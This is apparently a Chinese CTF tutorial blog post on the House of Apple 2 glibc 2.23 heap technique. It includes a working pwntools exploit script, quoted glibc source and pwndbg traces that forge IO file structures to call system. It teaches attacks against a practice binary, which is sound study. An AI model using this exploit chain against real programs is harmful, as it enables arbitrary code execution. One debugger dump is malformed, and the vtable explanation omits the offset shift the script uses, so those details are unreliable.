---
layout: post
title: 【pwn4heap】glibc2.23其九
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# 【pwn4heap】glibc2.23其九

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-35 house of apple其二

在glibc 2.24版本加强对`_IO_FILE_plus`虚表（vtable）的验证后，**House of Apple** 提供了一种有效的绕过机制。此方法的关键在于，**将堆破坏漏洞所获得的任意地址写能力，与glibc内部一个被认可但较少被直接利用的IO跳转表（例如`_IO_wfile_jumps_mmap`）结合**，从而构建一条能够通过安全检查的完整利用链。

整个利用过程可以清晰地归纳为三个循序渐进的阶段：

**第一阶段：建立利用基础——获得任意地址写能力**
首要步骤是利用堆漏洞（例如**Large Bin Attack**）获取一次**向任意地址写入可控数据**的原语。此原语通常用于向`_IO_list_all`等关键全局变量写入一个堆地址，这是后续所有操作的基石。

**第二阶段：构建恶意环境——伪造IO结构并劫持链表**
利用已获得的写能力，执行以下核心布置：
1.  **篡改全局链表头**：将管理所有打开文件流的全局指针`_IO_list_all`修改为指向一个在堆上预先构造的伪造`_IO_FILE_plus`结构。
2.  **植入合法虚表绕过检查**：**（此技术的精髓与绕过关键）** 在该伪造结构中，将其虚表（vtable）指针设置为glibc内部合法的**`_IO_wfile_jumps_mmap`**地址。由于此地址位于libc内合法的vtable内存区域，因此能通过范围检查。
3.  **布置完整的伪造数据**：精确设置伪造结构中的各个字段，以操控后续执行逻辑：
    *   将`_IO_FILE_plus`结构内的`_wide_data`指针指向一个可控的、伪造的`_IO_wide_data`结构。
    *   在该伪造的`_IO_wide_data`结构中，将其虚表（`_wide_vtable`）指针指向可控内存，并将`_wide_vtable`内的`__doallocate`项设置为最终目标函数地址（如`system`或`one_gadget`）。
    *   将`_IO_FILE_plus`结构中的`_flags`字段设置为特定值（例如`b”\xf9\xff||sh\x00\x00″`），用以通过后续执行路径中的各项状态检查，并可为`system`函数准备参数。

**第三阶段：引爆利用链——触发IO处理流程执行代码**
最终，当程序因调用`abort()`、`exit()`或因错误处理而触发`_IO_flush_all_lockp`函数时，该函数会遍历被我们污染的IO链表。对于链表中伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps_mmap`表中的 **`_IO_wfile_underflow_mmap`**函数。通过前期对伪造结构的精确控制，执行流将被引导依次经过`_IO_wfile_underflow_mmap` -> `_IO_wdoallocbuf` -> `_IO_WDOALLOCATE`，最终调用`_wide_vtable->__doallocate`，从而跳转到此前预设的函数地址（例如`system(“/bin/sh”)`），完成任意代码执行。

相关glibc完整源码参见[wfileops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wfileops.c#L388)：

```c
const struct _IO_jump_t _IO_wfile_jumps_mmap =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

static wint_t
_IO_wfile_underflow_mmap (_IO_FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);
    }

  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
    fp->_wide_data->_IO_buf_base;
  (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
			  fp->_IO_read_ptr, fp->_IO_read_end,
			  &read_stop,
			  fp->_wide_data->_IO_read_ptr,
			  fp->_wide_data->_IO_buf_end,
			  &fp->_wide_data->_IO_read_end);

  fp->_IO_read_ptr = (char *) read_stop;

  /* If we managed to generate some text return the next character.  */
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  /* There is some garbage at the end of the file.  */
  __set_errno (EILSEQ);
  fp->_flags |= _IO_ERR_SEEN;
  return WEOF;
}

void
_IO_wdoallocbuf (_IO_FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
```

本方法的执行最终依赖于glibc内部一条确定的错误处理与IO刷新路径。具体而言，可通过触发堆分配器错误（例如双重释放）来引导程序调用 **`malloc_printerr`** 函数。该函数在处理错误时，会调用 **`_IO_flush_all_lockp`** 以强制刷新所有已注册的IO流缓冲区。

`_IO_flush_all_lockp` 函数会遍历由 `_IO_list_all` 管理的全局IO链表，并对其中每个文件流调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。由于利用链已事先将伪造的 `_IO_FILE_plus` 结构插入此链表，并将其虚表设置为 **`_IO_wfile_jumps_mmap`**，因此实际被调用的 `_IO_OVERFLOW` 实现即为该表中的 **`_IO_wfile_underflow_mmap`** 函数。

后续的函数调用链与各个函数的作用如下：
*   **`_IO_wfile_underflow_mmap`**：这是从合法虚表出发的起始函数。它负责处理宽字符文件流的“下溢”操作（尝试读取）。在执行过程中，它会检查对应`_IO_FILE`结构的`_wide_data`及相关标志位，如果判断需要为宽字符流分配或准备缓冲区，则会调用`_IO_wdoallocbuf`。
*   **`_IO_wdoallocbuf`**：此函数的核心职责是执行或触发宽字符流缓冲区的分配。它会校验文件流的缓冲模式（`_IO_UNBUFFERED`标志等），若条件满足，则通过宏调用`_IO_WDOALLOCATE`来实际请求内存。
*   **`_IO_WDOALLOCATE`**：这是一个定义在`_IO_wide_data`结构关联的虚表（`_wide_vtable`）中的宏。它实质上是对该虚表中 **`__doallocate`** 函数指针的调用。这是控制流从常规IO处理逻辑转向完全可控区域的关键跳转点。
*   **`__doallocate`**：这是`_wide_vtable`虚表中的一个标准函数项，本意是用于分配宽字符缓冲区。通过完全控制伪造的`_IO_wide_data`结构及其`_wide_vtable`，可以将此函数指针设置为任意目标地址（如`system`或`one_gadget`），从而将其转化为代码执行的最终触发器。

因此，从触发错误到执行任意代码的完整控制流路径为： **`malloc_printerr` → `_IO_flush_all_lockp` → `_IO_OVERFLOW` (`_IO_wfile_underflow_mmap`) → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE` (`_wide_vtable->__doallocate`) → 可控的函数**。通过将`_wide_vtable->__doallocate`指向预定目标，即可实现最终的代码执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_two/exploit.py)。

核心利用代码如下：

```python
# house of apple two
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wfile_jumps_mmap = libc.sym["_IO_wfile_jumps_mmap"]
log.info(f"_IO_wfile_jumps_mmap addr: {hex(_IO_wfile_jumps_mmap)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)
# pwndbg> p/x (uint16_t)~(4|2)
# $1 = 0xfff9
# pwndbg>
payload = b"\x00" * 0x500 + b"\xf9\xff||sh\x00\x00"
edit(1, len(payload), payload)

fake_wide_data = p64(3) + p64(2)
fake_wide_data = fake_wide_data.ljust(0x30, b"\x00") + p64(0)
fake_wide_data = fake_wide_data.ljust(0x40, b"\x00") + p64(0)
fake_wide_data = fake_wide_data.ljust(0x130, b"\x00") + p64(chunk0_addr + 0x200)
payload = b"\x00" * 0x20 + fake_wide_data
fake_wide_vtable = b"\x00" * 0x68 + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_wide_vtable
edit(0, len(payload), payload)

fake_io = p64(0xFFFFFFFFFFFFFFFF)
fake_io = fake_io.ljust(0x20 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wfile_jumps_mmap + 0x8)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_two/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆利用的初始阶段，一种经典的信息泄露方法是通过操控特定堆块在分配器不同容器间的转移来实现。以下操作序列能够从**unsorted bin**中引导一个堆块移入**large bin**，并借助后者特殊的元数据布局，同时获取关键的**libc基址**与**堆内存地址**。

**操作步骤详述：**

1.  **初始化堆布局**：首先顺序分配三个堆内存块，分别记为`chunk[0]`、`chunk[1]`和`chunk[2]`。其中`chunk[1]`充当隔离块，防止`chunk[0]`与`chunk[2]`物理相邻而合并。一个必要条件是设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这确保了`chunk[0]`足够大，后续能被large bin接纳。

2.  **制造Unsorted Bin中的块**：接着，释放`chunk[0]`。由于其尺寸超出fast bin范围且不与top chunk相邻，它被放入**unsorted bin**。此时，其`fd`和`bk`指针被分配器设置为指向`main_arena`结构内部的特定地址，该地址与libc基址存在固定偏移。

3.  **引导转移至Large Bin**：随后，程序申请一个尺寸大于`chunk[0]`的新堆块`chunk[3]`。由于unsorted bin中的`chunk[0]`无法满足此次较大的分配请求，分配器会将其从unsorted bin中取出。依据其大小，它被归类并插入对应的**large bin**链表。

4.  **捕获Large Bin中的关键指针**：在large bin中，每个块除维护标准的`fd`和`bk`双向链表指针外，还包含一对用于快速索引不同大小块的`fd_nextsize`和`bk_nextsize`指针。当`chunk[0]`被置入一个空的large bin或成为该大小区间的首块时，其`fd_nextsize`和`bk_nextsize`会被初始化为指向其自身的堆地址。因此，此时`chunk[0]`的元数据区包含两类地址信息：
    *   `fd`与`bk`：指向`main_arena`内部的地址（**可用于计算libc基址**）。
    *   `fd_nextsize`与`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆地址**）。

**信息提取**：通过程序提供的读取功能（如`show(0)`）输出已被释放的`chunk[0]`的用户数据，其起始部分已被上述指针覆盖。由此可同时解析出`main_arena`相关地址（减去固定偏移得**libc基址**）以及指向自身的指针（获得**堆地址**）。这为后续的任意地址写与高级利用提供了必不可少的内存布局信息。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x60989aaed000
Size: 0x430 (with flag bits: 0x431)
fd: 0x7a4f1038df68
bk: 0x7a4f1038df68
fd_nextsize: 0x60989aaed000
bk_nextsize: 0x60989aaed000

Allocated chunk
Addr: 0x60989aaed430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x60989aaed940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x60989aaedd50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x60989aaee260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x60989aaed000 —▸ 0x7a4f1038df68 (main_arena+1096) ◂— 0x60989aaed000
pwndbg> 
```

在成功获取libc与堆地址后，利用流程进入实质性的构造阶段。接下来的操作旨在布置并触发一次可达成**双重写入**的**Large Bin Attack**，以同时劫持关键全局指针并污染另一处内存。

**具体步骤与原理如下：**

1.  **准备Unsorted Bin中的“载体”块**：释放之前预留的`chunk[2]`。由于其尺寸通常也超出fast bin范围，它会被插入**unsorted bin**，作为后续利用操作中将被移动的“载体”（victim）。

2.  **污染Large Bin中的元数据指针**：利用已获得的堆地址写能力，修改仍位于**large bin**中的`chunk[0]`的两个关键后向指针，分别指向两个利用目标：
    *   将`chunk[0]`的`bk`指针修改为`_IO_list_all - 0x10`。这是全局IO流链表头指针的附近地址。
    *   将`chunk[0]`的`bk_nextsize`指针修改为`target2`（例如`_IO_list_all - 0x20`或`global_max_fast`）。这是选择的第二个目标地址。

3.  **触发Large Bin Attack实现双重写入**：程序申请一个新的堆块`chunk[4]`，其大小必须满足：
    *   `chunk[4]->size > chunk[2]->size` （确保unsorted bin中的`chunk[2]`无法直接满足请求）。
    *   `chunk[4]->size > chunk[0]->size` （确保large bin中的`chunk[0]`也无法满足请求，迫使分配器整理unsorted bin）。
    当分配器尝试满足这次较大的请求时，它会将`chunk[2]`（victim）从unsorted bin中摘下，并依据大小将其插入`chunk[0]`所在的large bin链表。在此插入过程中，分配器会执行两次关键的链表写入操作：
    *   **第一次写入（通过`bk`）**：执行 `victim->bk->fd = victim`。由于`victim->bk`为`_IO_list_all - 0x10`，此操作向`*_IO_list_all`写入了`victim`（`chunk[2]`）的地址。
    *   **第二次写入（通过`bk_nextsize`）**：执行 `victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`为`target2`，此操作向`*(target2 + 0x20)`写入了`victim`的地址。

**利用结果**：成功触发Large Bin Attack后，实现了两次任意地址写：
1.  **全局指针`_IO_list_all`被修改为`chunk[2]`的堆地址**。这为后续伪造IO流结构奠定了基础。
2.  **在`target2 + 0x20`处被写入了一个堆地址**。通过选择不同的`target2`（如`global_max_fast`），可以扰乱堆分配器行为，为利用提供更多可能性。这体现了该原语在单一操作中污染两处内存的灵活性。

```bash
pwndbg> x/1gx &_IO_list_all
0x7a4f1038e540 <__GI__IO_list_all>:     0x000060989aaed940
pwndbg> x/10gx chunks
0x6098641c2060 <chunks>:        0x0000000000000020      0x000060989aaed010
0x6098641c2070 <chunks+16>:     0x0000000000000500      0x000060989aaed440
0x6098641c2080 <chunks+32>:     0x0000000000000400      0x000060989aaed950
0x6098641c2090 <chunks+48>:     0x0000000000000500      0x000060989aaedd60
0x6098641c20a0 <chunks+64>:     0x0000000000000500      0x000060989aaee270
pwndbg> 
```

在成功将`_IO_list_all`全局指针劫持为指向`chunk[2]`后，利用流程进入核心的数据构造阶段。此时，需在`chunk[2]`所指向的堆内存中，完整地伪造一个 **`_IO_FILE_plus`** 结构体，以此作为引导后续IO函数链执行恶意代码的“诱饵”。

**该伪造结构需精心设置以下核心字段：**

1.  **配置`_flags`字段**：
    将该字段赋值为`b”\xf9\xff||sh\x00\x00″`。此特定值的设定服务于两个关键目标：
    *   **满足状态校验**：其二进制位模式经过专门设计，旨在使伪造的文件流能通过`_IO_wfile_underflow_mmap`等函数内部对`_flags`的系列检查（如`_IO_NO_WRITES`、`_IO_CURRENTLY_PUTTING`等），确保执行流不被提前终止。
    *   **预制命令参数**：该字节序列中编码了字符串`”sh”`。这为在最终阶段，当控制流转入`system`函数时，直接提供了一个可用的命令行参数（即`/bin/sh`），从而简化了获取shell的步骤。

2.  **设置虚表（`vtable`）指针**：
    将结构体中的虚表指针设置为glibc内部合法的符号地址—— **`_IO_wfile_jumps_mmap`**。**这是绕过glibc 2.24版本引入的vtable范围检查的核心所在**。由于此地址位于libc内合法的虚表内存区域，因此能够通过验证。此项设置使得该伪造文件流的`_IO_OVERFLOW`函数指针实际指向`_IO_wfile_jumps_mmap`表中的`_IO_wfile_underflow_mmap`函数，从而将控制流导入预期的宽字符文件处理路径。

3.  **设置`_wide_data`指针**：
    将此指针指向另一处完全可控的内存地址，例如`p64(chunk0_addr + 0x30)`。其目的是在该目标地址（`chunk[0] + 0x30`）处 **伪造一个与之关联的`_IO_wide_data`结构**。在该伪造的`_IO_wide_data`结构中，进一步控制其虚表（`_wide_vtable`），并将`_wide_vtable`内的`__doallocate`函数指针项设置为最终的利用目标地址（如`system`或`one_gadget`）。

**小结**：此步骤的本质，是在被劫持的`_IO_list_all`所指向的堆内存（`chunk[2]`）上，构建一个可以通过所有安全检查的`_IO_FILE_plus`“外壳”。通过精确设定`_flags`绕过状态验证，通过指向合法`_IO_wfile_jumps_mmap`通过虚表校验，再通过`_wide_data`指针将执行流引向另一个完全可掌控的“数据核心”（伪造的`_IO_wide_data`及其虚表），从而为最终触发`_wide_vtable->__doallocate`调用并执行任意代码，完成全部的数据与指针准备。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x7c7cfff9,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0xffffffffffffffff,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x60989aaed030,
    _freeres_list = 0x2020202020202020,
    _freeres_buf = 0x2020202020202020,
    __pad5 = 0x2020202020202020,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7a4f1038c1a8
}
pwndbg> p/x *(struct _IO_jump_t*)0x7a4f1038c1a8 
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x7a4f1006c263,
  __finish = 0x7a4f10067587,
  __overflow = 0x7a4f100672bc,
  __underflow = 0x7a4f100655fa,
  __uflow = 0x7a4f10065405,
  __pbackfail = 0x7a4f10067926,
  __xsputn = 0x7a4f1006bf4c,
  __xsgetn = 0x7a4f10066d64,
  __seekoff = 0x7a4f1006d997,
  __seekpos = 0x7a4f1006b30a,
  __setbuf = 0x7a4f100677e1,
  __sync = 0x7a4f10061d6f,
  __doallocate = 0x7a4f1006bbf9,
  __read = 0x7a4f1006bc56,
  __write = 0x7a4f1006b9c0,
  __seek = 0x7a4f1006b758,
  __close = 0x7a4f1006bc3d,
  __stat = 0x7a4f1006e485,
  __showmanyc = 0x7a4f1006e48b,
  __imbue = 0x0
}
pwndbg> p/x &_IO_wfile_underflow_mmap
$3 = 0x7a4f100672bc
pwndbg> x/s _IO_list_all
0x60989aaed940: "\371\377||sh"
pwndbg> 
```

在可控的堆内存区域（例如`chunk0_addr + 0x30`）中，需要构造一个伪造的 **`_IO_wide_data`** 结构。此结构的布局经过精心设计以优化利用链：

**1. 结构体与虚表的一体化布局**
将伪造的`_IO_wide_data`结构体本身放置在`chunk0_addr + 0x30`。与此同时，将该结构所指向的虚表（`_wide_vtable`）设置在**同一堆块内的另一个偏移地址**，例如`chunk0_addr + 0x200`。**这种将核心数据结构与其跳转表（虚表）紧凑布置在同一可控内存块中的策略**，显著降低了利用的复杂性。它减少了对多个独立可控内存区域的依赖，简化了指针计算与内存布局，提升了利用的可靠性和成功率。

**2. 在虚表中设定最终的执行目标**
在位于`chunk0_addr + 0x200`的伪造`_wide_vtable`中，通过将其 **`__doallocate`** 函数指针项设置为希望最终执行的函数地址。这通常是以下二者之一：
*   **`system`函数地址**：当控制流抵达时，可实现任意命令执行。结合伪造`_IO_FILE_plus`中`_flags`字段预设的`”sh”`字符串，可达成调用`system(“/bin/sh”)`的效果。
*   或一个合适的 **`one_gadget`** 地址：用于直接跳转到libc中一段能启动shell的现有代码序列。

**总结**：此步骤通过在同一堆块内紧凑布置`_IO_wide_data`及其虚表，并将虚表中的关键函数指针（`__doallocate`）指向最终的目标，为整个利用链的终点——即当IO处理链调用`_wide_vtable->__doallocate`时——实现任意代码执行，完成了最后且最关键的数据准备。这种设计是House of Apple等高级IO利用手法中一种高效且常用的技巧。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x60989aaed030
$4 = {
  _IO_read_ptr = 0x3,
  _IO_read_end = 0x2,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60989aaed0e8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x60989aaed0e8

          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60989aaed128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x60989aaed128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x60989aaed200
}
pwndbg> p/x *(struct _IO_jump_t*)0x60989aaed200
$5 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x0,
  __overflow = 0x0,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x7a4f1003c3eb,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/5i 0x7a4f1003c3eb
   0x7a4f1003c3eb <__libc_system>:      sub    rsp,0x8
   0x7a4f1003c3ef <__libc_system+4>:    test   rdi,rdi
   0x7a4f1003c3f2 <__libc_system+7>:    jne    0x7a4f1003c40a <__libc_system+31>
   0x7a4f1003c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7a4f10156d7b
   0x7a4f1003c3fb <__libc_system+16>:   call   0x7a4f1003be36 <do_system>
pwndbg>
```

整个利用链的最终触发，依赖于主动制造一个堆分配错误。此时，若再次释放（`free`）已位于large bin中的`chunk[0]`，将立即触发glibc的**双重释放（double-free）检测**。分配器在`_int_free`函数中识别到该异常，随即调用 **`malloc_printerr`** 函数进入错误处理流程。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，尝试刷新所有已打开的IO流缓冲区。该函数遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已成功将`_IO_list_all`劫持为指向`chunk[2]`，因此遍历从我们伪造的IO结构开始。

执行流抵达`chunk[2]`上伪造的`_IO_FILE_plus`结构后，IO层会对其状态进行例行检查。由于预先精心设置了`_flags`等字段，该伪造结构通过了各项校验，被识别为一个有效的、可写的、且处于活跃输出状态的文件流。

随后，IO层在尝试刷新该伪造流的输出缓冲区时，会根据其内部指针状态（例如`_IO_write_ptr`与`_IO_write_end`的比较）判定需要执行缓冲区刷新操作。这一判定导致通过该文件流的虚表（vtable）调用其 **`_IO_OVERFLOW`** 函数。

由于我们已将伪造结构的vtable指针设置为 **`_IO_wfile_jumps_mmap`**，其`_IO_OVERFLOW`条目实际指向该跳转表中的 **`_IO_wfile_underflow_mmap`** 函数。至此，控制流被成功地从通用的错误处理路径，导入我们预先布置的、针对宽字符流的特定利用链起点，为执行后续恶意代码迈出了关键一步。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7a4f1006de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_underflow_mmap>
        rdi: 0x60989aaed940 ◂— 0x68737c7cfff9
```

当执行流进入 **`_IO_wfile_underflow_mmap`** 函数后，其内部存在一系列条件检查，以确定文件流的当前状态和应执行的操作路径。由于前期在伪造的`_IO_FILE_plus`及其关联的`_IO_wide_data`结构中对相关字段进行了**极为精确的构造**，以下所有关键检查被逐一满足，从而引导控制流沿着预设路径前进：

1.  **绕过“不可读”检查**：函数首先检查 `if (__glibc_unlikely (fp->_flags & _IO_NO_READS))`。在伪造的`_flags`字段中， **`_IO_NO_READS`标志位被明确清除**（即该位为0），使得文件流被识别为可读，此条件不成立，执行流继续。

2.  **绕过“宽字符读缓冲区仍有数据”检查**：接着检查 `if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)`。我们通过将伪造的`_IO_wide_data`结构中的`_IO_read_ptr`和`_IO_read_end`指针**设置为相等的值**（例如都设为0，或指向同一位置），使得该条件为假，从而进入需要分配或准备宽字符缓冲区的分支，而非直接返回现有数据。

3.  **绕过“窄字符流需要补充数据”检查**：随后，函数会尝试通过调用`_IO_file_underflow_mmap`来补充窄字符（`char`）流缓冲区，其条件为 `if (fp->_IO_read_ptr >= fp->_IO_read_end && ...)`。通过将`_IO_read_ptr`和`_IO_read_end` **也设置为相等的值**，可以触发此条件。然而，**更为关键的布局技巧**是，通过设定`_flags`中的其他位（如`_IO_NO_WRITES`等）或控制相关指针，使得`_IO_file_underflow_mmap`调用最终**返回`EOF`**。这使得检查条件整体为真，但返回结果（`EOF`）会引导执行流转向处理宽字符缓冲区的路径。

